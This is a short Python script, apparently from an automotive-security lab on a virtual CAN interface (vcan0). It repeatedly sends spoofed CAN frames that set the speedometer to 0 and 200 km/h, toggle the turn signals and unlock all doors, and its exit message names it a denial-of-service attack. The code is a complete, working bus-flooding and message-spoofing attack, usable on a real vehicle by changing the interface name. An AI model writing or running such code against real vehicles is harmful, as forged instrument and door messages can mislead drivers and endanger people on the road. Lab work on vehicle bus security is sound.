import socket
import struct
import sys
import os

sock = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW) #crating socket
sock.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_ERR_FILTER, socket.CAN_ERR_MASK)#allow socket to receive error frames

interface = "vcan0"

try:
    sock.bind((interface,))

except socket.error as e:
    print(str(e))
    print("\n--------------------------------------------------------------------------------")

can_frame_format = "<LB3xq"
can_msg1 = struct.pack(can_frame_format,580,8,0) #speed 0 in digital meter
can_msg2 = struct.pack(can_frame_format,580,8,3932100001000) #speed 200km/h in digital meter
can_msg3 = struct.pack(can_frame_format,392,4,0x002) #signal light right
can_msg4 = struct.pack(can_frame_format,392,4,0x001) #signal light right
can_msg5 = struct.pack(can_frame_format,411,6,0) # all door open

try:
    while True:
        msg = sock.send(can_msg1)
        msg =+ sock.send(can_msg2)
        msg =+ sock.send(can_msg3)
        msg =+ sock.send(can_msg4)
        msg =+ sock.send(can_msg5)

except KeyboardInterrupt:
    print("\n dos attack stoped!")
